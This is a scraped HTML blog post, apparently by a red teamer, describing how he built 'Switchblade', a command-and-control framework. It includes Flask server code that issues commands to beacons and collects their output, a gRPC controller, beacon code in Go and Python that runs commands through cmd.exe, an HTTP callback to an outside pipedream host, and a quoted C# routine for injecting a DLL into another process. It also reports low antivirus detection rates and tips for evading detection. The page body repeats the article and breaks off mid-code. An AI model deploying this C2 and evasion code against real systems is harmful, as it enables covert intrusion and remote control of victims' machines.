content="article" /><meta property="article:published_time" content="2022-12-16T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Breaking Down Creating A Redteam Framework" /><meta name="twitter:site" content="@mattculbert" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-12-16T00:00:00+00:00","datePublished":"2022-12-16T00:00:00+00:00","description":"A Quick Review Of Where We Started Switchblade started out about a year ago with an idea taken from the leaked CIA toolset. The tool was called Switchblade, and it used mutual TLS in order to route beacons checking in versus nosy blue team defenders trying to figure out where this beacon was reaching out to. It’s a fairly simple nginx configuration that used the proxy pass method in order to send people who didn’t authenticate to a bogus page or a whole other server entirely. Really it was the beacon, an nginx configuration file, and a netcat listener. But from this came came the desire to build it out to be more. It was around this time I was reading every update that Nighthawk published and I wanted to push Switchblade to be more than just a simple executable and netcat listener. And now we’re here! Be forewarned, if you don’t like programming, the whole rest of this is dedicated to talk about programming and decisions made. Breaking It Down Let’s break down all the pieces into their respective chunks for an easier time analysing them. The Backend A good solid backend is critical to a functioning redteam framework. Without a management system that works and remembers what beacon is what, you will quickly lose track of who is who. Then you also have to think about how these beacons will communicate with the backend that is dolling out their commands and decoding the results. To this end, Flask emerged as the easiest way to manage both the tracking method and command relay. If we store the beacons as a UUID HTML file, they’re all unique and we can quickly assign them new commands to execute through an HTTP GET request, getting the results back in a POST. I also needed a way to manage running this Flask server while simultaeneously reading back results, sending updates, and general beacon management. But running this concurrently while Flask was running was not feasible. Flask, once started, blocks further input from the CLI. I could mess with concurrancy and threading, or I could deploy gRPC. I chose the latter. gRPC is a wonderful tool that was developed by Google for interacting with a number of microservices running in their data centers. It’s a remote procedure call that is designed specifically for what we are looking to do, non interruptive interaction. Let’s take a quick look at how intial beacon contact is handled through Flask after the server is started: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @app.route(&quot;/&quot;) def home(): # Grab the appsessionid value from the headers val = request.headers[&#39;APPSESSIONID&#39;] if set(val).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: message = &quot;whoami&quot; print(f&#39;headers:{val}&#39;) # create a new page for the UUID we got from the headers with open(f&quot;{val}.html&quot;, &quot;w&quot;) as f: f.write(message) return (&#39;&#39;) Here, when a beacon first checks in, we create an HTML file named after their UUID that they set. To avoid any nefariour command injection through the APPSESSIONID parameter, we filter out anything not needed for the UUID. Further requests from the beacon are sent to their dedicated UUID URL: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @app.route(&#39;/&lt;path:filename&gt;&#39;, methods=[&#39;GET&#39;]) def index(filename): if request.method == &#39;GET&#39;: bID = {request.headers[&#39;APPSESSIONID&#39;]} name = request.headers[&#39;RESPONSE&#39;] print(f&#39;Host {bID} grabbed command&#39;) bID = str(bID) if set(bID).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass elif set(name).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: with open(f&#39;{bID}.html&#39;) as f: content = f.readlines() for line in content: cmd = line conn.hset(&#39;beacons&#39;, f&#39;{bID}&#39;, f&#39;{cmd}&#39;) # Add the beacon ID and command to the redis DB date = datetime.datetime.now() conn.hset(&#39;beacons&#39;, f&#39;{date}&#39;, f&#39;{bID} + {cmd}&#39;) # Create cmd history conn.hset(&#39;beacons&#39;, f&#39;{name}&#39;, f&#39;{bID}&#39;) return send_from_directory(&#39;.&#39;, filename) return jsonify(request.data) The beacon sends a GET for its specific page and again we are just dropping requests with special characters. Once it finds the page, we read the command out of it and respond back with what should be executed, also adding a command history to a Redis database. Finally, to get the results of the command: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @app.route(&quot;/schema&quot;, methods=[&#39;POST&#39;]) def results(): if request.method == &#39;POST&#39;: bID = {request.headers[&#39;APPSESSIONID&#39;]} bID = str(bID) if set(bID).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: total = f&#39;Result: {request.data} from beacon: {bID}&#39; response = request.data response = str(response) response = response.strip() print(response) conn.hset(&quot;beacons&quot;, bID, total) return &#39;HELO&#39; We use the request.data method as a part of Flask in order to get the contents of the POST request. We then write the results of the command to the Redis database. Then we come to the gRPC implementation. There’s much more that goes into this than just the classes here, the protobuff.proto file outlines the message types like string and bool as well as defining our expected results. For this post, however, we will only be looking at the Python class portion. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class UnaryService(pb2_grpc.UnaryServicer): def __init__(self, *args, **kwargs): pass def GetServerResponse(self, request, context): # We need an ID (ID for beacon) and message (What to tell the beacon) message = request.message ID = request.bID opt = request.opt if set(ID).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: if opt == &#39;SC&#39;: # If option is to set command, then write it to the file with open(f&quot;{ID}.html&quot;, &quot;w&quot;) as f: f.write(message) result = f&#39;Received command, wrote {message} to file {ID}&#39; result = {&#39;message&#39;: result, &#39;received&#39;: True} return pb2.MessageResponse(**result) elif opt == &#39;GR&#39;: # If option is to get the returned results of a beacon, page the Redis DB for the results res = conn.hget(&#39;beacons&#39;, f&#39;{ID}&#39;) res = str(res) result = f&#39;Getting status of beacon {ID}: {res}&#39; result = {&#39;message&#39;: result, &#39;received&#39;: True} return pb2.MessageResponse(**result) else: pass This class is designed to take input from the controller program and do a select number of things. We can either set a command or get the returned result. Depending on what is selected, the Redis database is paged looking for different things. This is then communicated over the protobuff back to the controller. There are a number of issues with this design that are not addressed here. First, if there is not a reverse proxy in front of the listener that’s routing bad requests away or something similar, then someone could flood the server with requests to generate enough new HTML files to cause a denial of service. Additionally, there is nothing verifying commands sent to beacons so someone could intercept them and issue their own commands to be executed. Solving the latter issue will be a matter of command signing in order to verify legitimacy, but that is still to be implemented. The Controller To interact with the backend management, we have a controller that uses the aforementioned gRPC in order to facilitate this. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class UnaryClient(object): &quot;&quot;&quot; Client for gRPC functionality &quot;&quot;&quot; def __init__(self): self.host = &#39;localhost&#39; self.server_port = 50051 # instantiate a channel self.channel = grpc.insecure_channel( &#39;{}:{}&#39;.format(self.host, self.server_port)) # bind the client and the server self.stub = pb2_grpc.UnaryStub(self.channel) def get_url(self, message, beaconID, opt): &quot;&quot;&quot; Client function to call the rpc for GetServerResponse &quot;&quot;&quot; message = pb2.Message(bID=beaconID, message=message, opt=opt) print(f&#39;{message}&#39;) return self.stub.GetServerResponse(message) This takes an input in the form of beaconID; commandToSet; choice where the choice is if you want to set a command or get the results. The Message properties are pre-defined in the protobuff.proto file as three string parameters, and the GetServerResponse is defined to return a simple message. gRPC does a lot of heavy lifting for us here. In order to actually send the command through the UnaryClient, the following function was used: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def SendCommand(): &#39;&#39;&#39; This uses gRPC to talk with the C2 We take the command to run and the beaconID to update and write it to the beacons file The C2 awaits the POST response and then sends that back over here :param command: The command to run :param beaconID: The beacon we want to target :return: Get the result of the command &#39;&#39;&#39; beaconID = input(&quot;Input beacon ID &gt; &quot;) command = input(&quot;If setting new command &gt; &quot;) opt = input(&quot;Get Results (GR) or Set Command (SC) &gt; &quot;) client = UnaryClient() result = client.get_url(message=command, beaconID=beaconID, opt=opt) print(f&#39;{result}&#39;) We use the get_url method defined in the UnaryClient class in order to send this newly constructed message. The Beacon The beacon is the most critical part to a redteam framework. If it’s poorly written, then alerts will pop and data will be corrupted, completely negating any benefits gained from performing these emulations. Upper management is already hesitant to do such tests, so poorly run ones will only further cement why they dislike them. Diving into the beacon, it was rewritten in two new languages for this. That was Go and C#. I had a few different motivations for doing so. The primary one was I felt like I reached the limits of Python. If I wanted to do any more specialized evasion stuff, I would need to import CTypes and at that point, why not just use C right? Additionally, with Go and C#, I could build the final beacon to be compatible for any system as opposed to just an .exe for Windows or just a .py script for Nix systems. The final overarching reason for doing so was also just to learn more. C# is incredibly powerful as outlined in previous posts here and elsewhere. You can unhook NTDLL, overwrite memory locations with what you think should go there, inject shellcode, and so on. Also note, a big reason that Virustotal does not flag these files is not because of any special evasion implemented, but because of their previously unknown structure making static analysis almost useless. Let’s start with how it went with Go first. Go was without a doubt far quicker to transition from Python to than C#. The syntax was very similar and libraries felt like they functioned much the same way. For instance, a GET request in Go would look like this: 1 2 3 4 client := http.Client{} // Make our web client structure req, err := http.NewRequest(&quot;GET&quot;, &quot;http://google.com&quot;, nil) // Define a new request req.Header.Add(&quot;User-Agent&quot;, &#39;Im a super nifty header&#39;) // Add some cool new headers resp, err := client.Do(req) // Send it off And the same thing in Python: 1 2 3 4 headers = { &#39;User-Agent&#39;: &#39;Im a super nifty header&#39; # Set up a cool header } requests.get(f&#39;http://google.com&#39;, headers=headers) # Send the request Go requires you to do a little more setup than Python, but otherwise it’s much the same. This can be seen again in the command execution function. First is how it’s performed in Go: 1 2 3 cmd := exec.Command(&quot;cmd.exe&quot;, &quot;/C&quot;, beacon_command) // exec.Command returns the Cmd struct to execute the named program with the given arguments. result, _ := cmd.Output() // And then get the output, _ here is to grab any errors hostname := []byte(result) And again in Python: 1 2 3 4 command = [&#39;cmd.exe&#39;, &#39;/c&#39;, beacon_command] # Forming the layout of the command here process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False) out, err = process.communicate() hostname = out.decode() A lot of time was spent on figuring out how commands should be executed. If it’s too obvious that it’s coming from a web request, the EDR will flag it. I spent a while going back and forth on how this should be done. I wanted to execute the command under an entirely new process that wouldn’t inherit any data from the parent process so as to avoid linking back. It’s actually really neat how this functions though. If you include creationflags=0x00000008, then you get a fully independant process who’s parent has died for all intents and purposes, but the command spawned still persists. But this had drawbacks. I couldn’t get the command output on things like dir and that’s a deal breaker for general execution. This is still viable though for edge case scenarios like spawning new persistent processes or sacrificial processes whos context we can execute commands in to avoid crashing the primary process. In the end, the flag for detached processes was dropped in favor of more reliable general command execution. close_fds gets us half way there by keeping the parent file descriptors from being copied to the subprocess though. The overall detection for the Go beacon was pretty low. No one on Antiscan picked it up: And only 6 vendors picked it up on Virustotal: These low detection rates can primarily be attributed to how Golang is compiled, though I was able to knock Microsoft off the detection list by first assigning the retrieved command to a new variable as opposed to passing it directly to be executed. One other point on Go, typically beacons generated from it are very hard for AV to detect. This is due to them statically linking all the necessary libraries needed for compiling, which bumps the file size up past what some AV’s can handle scanning. This isn’t a new tactic either, the Commie malware family padded 64MB of data to their compiled executables in order to avoid being scanned. Now how did it go with C#? I originally wanted to use C++ for this actually, but encountered a number of issues that C# had already resolved. The crux of the Switchblade communication design is GET and POST web requests and, surprisingly, C++ does not have an easy native way to perform these. You have to import another library in order to do this. So not a big deal, go to GitHub, grab one, import it. Ah but the one you grabbed doesn’t compile with the latest version of Visual Studio you have, so should you troubleshoot the compatability issue or use the 2019 version over the 2022 version? I’m sure more experienced developers more familiar with C++ are shouting at this with an easy solution, but in that moment it was just very confusing to figure out. Using C# though was much easier comparitively. What took essentially one line in Python, took a few more in C#, but the end result was a very stable HTTP structure. And this was all with builtin structures, no downloading 3rd party libraries from Github and installing them yourself and troubleshooting what version of VS they were made for, it just worked. 1 2 3 4 5 6 7 8 using (client) { client.BaseAddress = new Uri(&quot;https://eoqqzdfuzmgq7gg.m.pipedream.net/&quot;); HttpResponseMessage response = client.GetAsync(&quot;&quot;).Result; response.EnsureSuccessStatusCode(); string result = response.Content.ReadAsStringAsync().Result; Console.WriteLine(&quot;Result: &quot; + result); } Pretty nifty right? The original goal with using C++ was also to be able to do a bunch of advanced memory things, like injecting shellcode into running processes. C#, by nature of being a C based language, has all these tools to do memory modification that you would expect with C++! You still have things like CreateRemoteThread, WriteProcessMemory, and LoadLlibraryA. For example, look at the following code taken from Codingvision.net: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public static int Main() { // the target process - I&#39;m using a dummy process for this // if you don&#39;t have one, open Task Manager and choose wisely Process targetProcess = Process.GetProcessesByName(&quot;testApp&quot;)[0]; // geting the handle of the process - with required privileges IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id); // searching for the address of LoadLibraryA and storing it in a pointer IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); // name of the dll we want to inject string dllName = &quot;test.dll&quot;; // alocating some memory on the target process - enough to store the name of the dll // and storing its address in a pointer IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // writing the name of the dll there UIntPtr bytesWritten; WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten); // creating a thread that will call LoadLibraryA with allocMemAddress as argument CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero); return 0; } This reads strikingly similar to C++ functions designed to do the same thing. The point being that by using C# instead of C++, there’s very little sacrificed. Go was evidently easier to transition to, but C# definitely had more to teach me. Go was very forgiving with how the program coud be laid out while with C#, if you got the function declaration wrong, nothing would work. C# was also very interesting from a compilation standpoint. The program could be compiled down to a DLL through the shortcut ctrl shft b or an executable for Windows or Ubuntu with dotnet publish -c Release -r win10-x64 without issue, and this opens up even more avenues of exploitation. The detection rate for each file was also increadibly low: What Was Learned It is exhausting keeping up with all the issues that are discovered along the way, but that’s the case with any project this size. Regardless of how tiring it was, learning how to use gRPC and how to build the same application in Python, C#, and Go was really rewarding. Comparing the different detection rates between languages was interesting and shows that engines still have a long way to go with analysis, so implementing additional protections that look at behaviour is very important. Some may be wondering why the only method implemented in the beacon is direct command execution. Why not put in other tools like registry modification, file deletion, file upload, and SMB communication that don’t go through the command prompt? These are not off the table at all and all are good ideas, but for the original purposes of this project, being able to execute arbitrary commands was enough as it could do most of these functions anyways, just in a much more bulky and cumbersome manner. Another question may be why use Flask, why not handle the HTTP requests through other methods like in Go? A valid question! The primary reason for using Flask was that it was the quickest way to build it out in Python, which is the language I know the strongest. Flask has a bunch of great features as well like being able to serve TLS secured connections, though this can be worked around again using an nginx front end. Because I was able to handle everything very intuitively through Flask, I could spend more time focusing on other aspects of the framework. Or another way to put it, if you cook a lot, is to bake the bread and buy the butter.","headline":"Breaking Down Creating A Redteam Framework","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/Breaking-Down-Creating-A-Redteam-Framework/"},"url":"/posts/Breaking-Down-Creating-A-Redteam-Framework/"}</script><title>Breaking Down Creating A Redteam Framework | Culbert Report</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Culbert Report"><meta name="application-name" content="Culbert Report"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/thumb.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Culbert Report</a></div><div class="site-subtitle font-italic">Get in loser, we're hating AI and bringing back real learning. Site art by Kenton Drumm</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/matt-culbert" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/mattculbert" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['matt','culbertreport.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Breaking Down Creating A Redteam Framework</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Breaking Down Creating A Redteam Framework</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1671148800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 16, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/">Matt Culbert</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3266 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><h1 id="a-quick-review-of-where-we-started">A Quick Review Of Where We Started</h1><p>Switchblade started out about a year ago with an idea taken from the leaked CIA toolset. The tool was called Switchblade, and it used mutual TLS in order to route beacons checking in versus nosy blue team defenders trying to figure out where this beacon was reaching out to. It’s a fairly simple nginx configuration that used the proxy pass method in order to send people who didn’t authenticate to a bogus page or a whole other server entirely. Really it was the beacon, an nginx configuration file, and a netcat listener. But from this came came the desire to build it out to be more. It was around this time I was reading every update that Nighthawk published and I wanted to push Switchblade to be more than just a simple executable and netcat listener. And now we’re here!</p><p>Be forewarned, if you don’t like programming, the whole rest of this is dedicated to talk about programming and decisions made.</p><h1 id="breaking-it-down">Breaking It Down</h1><p>Let’s break down all the pieces into their respective chunks for an easier time analysing them.</p><h2 id="the-backend"><span class="mr-2">The Backend</span><a href="#the-backend" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A good solid backend is critical to a functioning redteam framework. Without a management system that works and remembers what beacon is what, you will quickly lose track of who is who. Then you also have to think about how these beacons will communicate with the backend that is dolling out their commands and decoding the results.</p><p>To this end, Flask emerged as the easiest way to manage both the tracking method and command relay. If we store the beacons as a UUID HTML file, they’re all unique and we can quickly assign them new commands to execute through an HTTP GET request, getting the results back in a POST.</p><p>I also needed a way to manage running this Flask server while simultaeneously reading back results, sending updates, and general beacon management. But running this concurrently while Flask was running was not feasible. Flask, once started, blocks further input from the CLI. I could mess with concurrancy and threading, or I could deploy gRPC. I chose the latter. gRPC is a wonderful tool that was developed by Google for interacting with a number of microservices running in their data centers. It’s a remote procedure call that is designed specifically for what we are looking to do, non interruptive interaction.</p><p>Let’s take a quick look at how intial beacon contact is handled through Flask after the server is started:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="c1"># Grab the appsessionid value from the headers
</span>    <span class="n">val</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">APPSESSIONID</span><span class="sh">'</span><span class="p">]</span>
    <span class="k">if</span> <span class="nf">set</span><span class="p">(</span><span class="n">val</span><span class="p">).</span><span class="nf">difference</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">):</span>
        <span class="c1"># We're not going to bother with input sanitization here
</span>        <span class="c1"># If we receive special characters just drop it entirely
</span>        <span class="k">pass</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">message</span> <span class="o">=</span> <span class="sh">"</span><span class="s">whoami</span><span class="sh">"</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">headers:</span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
        <span class="c1"># create a new page for the UUID we got from the headers
</span>        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s">.html</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
        <span class="nf">return </span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
</pre></table></code></div></div><p>Here, when a beacon first checks in, we create an HTML file named after their UUID that they set. To avoid any nefariour command injection through the APPSESSIONID parameter, we filter out anything not needed for the UUID.</p><p>Further requests from the beacon are sent to their dedicated UUID URL:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/&lt;path:filename&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">bID</span> <span class="o">=</span> <span class="p">{</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">APPSESSIONID</span><span class="sh">'</span><span class="p">]}</span>
        <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">RESPONSE</span><span class="sh">'</span><span class="p">]</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Host </span><span class="si">{</span><span class="n">bID</span><span class="si">}</span><span class="s"> grabbed command</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">bID</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">bID</span><span class="p">)</span>
        <span class="k">if</span> <span class="nf">set</span><span class="p">(</span><span class="n">bID</span><span class="p">).</span><span class="nf">difference</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">):</span>
         <span class="c1"># We're not going to bother with input sanitization here
</span>         <span class="c1"># If we receive special characters just drop it entirely
</span>         <span class="k">pass</span>
        <span class="k">elif</span> <span class="nf">set</span><span class="p">(</span><span class="n">name</span><span class="p">).</span><span class="nf">difference</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">):</span>
         <span class="c1"># We're not going to bother with input sanitization here
</span>         <span class="c1"># If we receive special characters just drop it entirely
</span>         <span class="k">pass</span>
        <span class="k">else</span><span class="p">:</span>
         <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">bID</span><span class="si">}</span><span class="s">.html</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
             <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
         <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
             <span class="n">cmd</span> <span class="o">=</span> <span class="n">line</span>
